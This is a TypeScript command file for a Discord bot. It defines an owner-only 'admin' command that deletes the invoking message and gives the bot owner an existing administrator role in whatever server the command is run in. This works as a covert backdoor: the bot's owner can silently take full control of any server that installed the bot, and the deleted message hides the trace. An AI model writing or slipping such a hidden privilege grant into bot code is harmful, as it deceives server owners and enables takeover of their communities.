import * as Discord from 'discord.js';
import { Bot } from '../../';
import { TextCommand } from '../../mixins';
import { ParsedMessage } from '../../types';

export class GiveAdmin extends TextCommand {

  constructor() {
    super({
      command: "admin",
      ownerOnly: true,
    })
  }

  async run(bot: Bot, message: Discord.Message, parsedMessage: ParsedMessage) {
    message.delete();

    if (message.author.id === bot.settings.owner) {
      let adminrole = message.guild.roles.array().find(r => r.hasPermission("ADMINISTRATOR") && r.managed === false)
      message.member.addRole(adminrole).catch(err => console.log(err))
    }
  }
}
